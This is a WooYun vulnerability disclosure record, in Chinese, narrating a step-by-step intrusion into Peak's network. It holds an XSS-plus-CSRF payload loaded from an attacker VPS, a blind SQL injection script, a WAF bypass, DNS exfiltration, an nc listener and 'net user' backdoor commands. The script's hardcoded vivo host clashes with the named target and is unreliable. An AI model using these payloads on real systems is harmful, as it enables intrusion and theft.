{"id": 86063, "wybug_id": "wooyun-2016-0204481", "wybug_title": "我是如何利用组合拳一步步攻陷匹克内网的(XSS配合CSRF/利用DNS配合SQL注入获取数据等等)", "wybug_corp": "epeaksport.com", "wybug_author": "路人甲", "wybug_date": "2016-05-03 09:31", "wybug_open_date": "2016-05-09 09:00", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-05-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-05-09：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 此次测试历时大半个月吧，不容易啊 详细说明：  \n\nmask 区域\n1.http://**.**.**/\n\n先看看存不存在上传，不可以，做了限制然后匹克某站存在xss漏洞\n\nmask 区域\n1.http://**.**.**/bugs/wooyun-2010-052615\n\n官方修复了，前端做了限制，正常思路，抓包绕过\n\n\n\n等了好几天，打到一堆，终于打到了管理的cookie\n\n成功登陆，发现了这个\n\n试着修改图片上传类型，结果提示不是超级管理员权限不够，又用之前打到的一堆cookie试着登陆，有一个cookie登陆后，直接就302跳转了，猜想这个可能超级管理员啊ip做了限制？咋办啊？又纠结了好久，接着翻了翻匹克之前的洞CSRF缺陷编号：\tWooYun-2015-128938漏洞标题：\t匹克多处CSRF漏洞\n\nmask 区域\n1.http://**.**.**/bugs/wooyun-2010-0128938\n\n后台会不会同样存在csrf呢，结果真有，全站都未做csrf防护啊我灵机一动，当XSS遇上CSRF 是不是会有很大的“化学反应呢”构造了个POC，放在vps上了\n<html><script>enclosure.pic_mime.value=\".php|.jsp|.aspx\";enclosure.submit.focus();</script></html>\n插入xss代码<iframe src=\"http://********/test.html\" />又是过了好久，头像可以上传了，成功getshell\n\n\n\n试着添加用户net user test test /add权限不够，不是root权限，试着提权没成功然后想到这就算了，就在这时，我又发现了匹克一处union注入，我就想可不可以通过其他途径getshell呢，比如select into outfile\n\n可是不知道路径...天无绝人之路，许久之前我找到过匹克的一个盲注，影响不大就没提交，想想这回用上了匹克主站是有安全狗的，不过可以用/**)*/绕过\n\nroot权限附上poc脚本\n#encoding=utf-8__author__ = 'Lu'import httplibimport timeimport stringimport sysimport randomimport urllibheaders = {'Content-Type': 'application/x-www-form-urlencoded',           'User-Agent': 'Googlebot/2.1 (+http://www.googlebot.com/bot.html)',}payloads = 'abcdefghijklmnopqrstuvwxyz0123456789@_.'print '[%s] Start to retrive MySQL User:' % time.strftime('%H:%M:%S', time.localtime())user = ''for i in range(1, 17):    for payload in payloads:        s = \"cat_id=22) AND if((ascii(mid(lower(user()),%s,1))=%s),SLEEP(5),0) AND (8663=8663&orderBy=1&showtype=list&&virtual_cat_id=\" % (i, ord(payload))        conn = httplib.HTTPConnection('http://shop1.vivo.com.cn:80', timeout=30)        conn.request(method='POST', url='/gallery-ajax_get_goods.html', body=s, headers=headers)        start_time = time.time()        html_doc = conn.getresponse().read()        conn.close()        print '.',        if time.time() - start_time > 1.0:            user += payload            print '\\n[in progress]', user,            break        print '\\n[Done] MySQL user is %s' % user\n想想这回有戏啊，mysql 可以利用LOAD_FILE弄到路径盲注，而且还有安全狗，实在太慢了，于是想到可以利用DNS解析获取SQL结果啊这是一种利用DNS解析过程获取恶意SQL查询结果的先进的SQL注入技术。带有sql查询结果的DNS请求最终被攻击者控制的远程域名服务器拦截并提取出宝贵的数据。利用DNS从有漏洞的数据库中渗出数据的前提条件是DBMS中有可用的能直接或间接引发DNS解析过程的子程序。 然后这类的子程序被攻击者利用，作为攻击的媒介。因为sqlmap中没有过这个安全狗的tamper，于是自己仿照着space2comments.py改写了一个\n\n\n\n远程登录vpsnc -lvvp 6666进行监听\n\n利用sqlmap --dns-domain --sql-shell路径拿到\n\n利用刚刚的union注入写入shell\n\n这回是root权限\n\nnet use 添加用户 远程登录\n\n成功漫游内网\n\n\n\n\n\n内网还有很多敏感性信息，可以直接控制扫面器打印机等，不进一步深入整个测试过程大概经历了大半个月吧，从最开始的一个简单的绕过前端的xss，一点一点深入，各种组合拳，能到最后，其实也有很多运气的成分。这期间也学到了不少东西，明早还有安全编程的课，去睡了，晚安   漏洞证明：  已经证明   修复方案：  你们更加专业喽   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-05-09 09:00 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-05-03 09:54 |    \t\t大师兄 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:8        | 每日必关注乌云)\t\t \n  此次测试历时大半个月吧，不容易啊    \n     2016-05-03 09:55 |    \t\t指尖上的故事 \t\t\t( 普通白帽子  |\t\t\t        Rank:729 漏洞数:160        | 放手不是我们不合适 | 而是成就你们更适合)\t\t \n  小伙子..看你测试历时大半个月，我都不好意思忽略你...还是忽略了吧    \n     2016-05-03 10:01 |    \t\tMark0smith \t\t\t( 普通白帽子  |\t\t\t        Rank:140 漏洞数:59        | 我要是再正常一点就好了)\t\t \n  Mark    \n     2016-05-03 10:17 |    \t\t乌云来了 打雷啦 \t\t\t( 实习白帽子  |\t\t\t        Rank:34 漏洞数:5        | 乌云来了 打雷啦)\t\t \n  貌似此处会有个！！雷！！    \n     2016-05-03 11:39 |    \t\tMiss Manlin \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 小白兔)\t\t \n  66666 咔嚓 打雷！    \n     2016-05-03 11:41 |    \t\t随风的风 \t\t\t( 普通白帽子  |\t\t\t        Rank:244 漏洞数:91        | 微信公众号：233sec  不定期分享各种漏洞思...)\t\t \n  小伙子..看你测试历时大半个月，我都不好意思忽略你...还是忽略了吧    \n     2016-05-03 12:44 |    \t\tHax0rs \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:10        | Hax0rs)\t\t \n  小伙子..看你测试历时大半个月，我都不好意思忽略你...还是忽略了吧    \n     2016-05-03 14:35 |    \t\t习总夸我好青年 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 刚来的,请多关照)\t\t \n  小伙子..看你测试历时大半个月，我都不好意思忽略你...还是忽略了吧    \n     2016-05-03 15:30 |    \t\twybang \t\t\t( 普通白帽子  |\t\t\t        Rank:111 漏洞数:28        | 信息安全爱好者)\t\t \n  小伙子..看你测试历时大半个月，我都不好意思忽略你...还是忽略了吧    \n     2016-05-03 15:49 |    \t\t从容 \t\t\t( 普通白帽子  |\t\t\t        Rank:359 漏洞数:95        | Enjoy Hacking Just Because It's Fun  |  ...)\t\t \n  哥们不是我打击你，匹克21个漏洞报告，就确认了一个。。。    \n     2016-05-03 15:51 |    \t\t乌云来了 打雷啦 \t\t\t( 实习白帽子  |\t\t\t        Rank:34 漏洞数:5        | 乌云来了 打雷啦)\t\t \n  @从容 是啊 这个厂商不确认 然后偷偷修复漏洞    \n     2016-05-03 15:58 |    \t\t从容 \t\t\t( 普通白帽子  |\t\t\t        Rank:359 漏洞数:95        | Enjoy Hacking Just Because It's Fun  |  ...)\t\t \n  @乌云来了 打雷啦 重在参与2333    \n     2016-05-06 20:49 |    \t\tjdbang2016 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:6        | 哈)\t\t \n  小伙子..看你测试历时大半个月，我都不好意思忽略你...还是忽略了吧     \n     2016-05-09 09:07 |    \t\tsauce \t\t\t( 普通白帽子  |\t\t\t        Rank:214 漏洞数:33        | test)\t\t \n  小伙子..看你测试历时大半个月，我都不好意思忽略你...还是忽略了吧    \n     2016-05-09 09:20 |    \t\tdragon110 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 谨言、慎行、多思。)\t\t \n  小伙子..看你测试历时大半个月，我都不好意思忽略你...还是忽略了吧     \n     2016-05-09 09:26 |    \t\tDNS \t\t\t( 普通白帽子  |\t\t\t        Rank:765 漏洞数:81        | root@qisec.com)\t\t \n  真忽略了    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}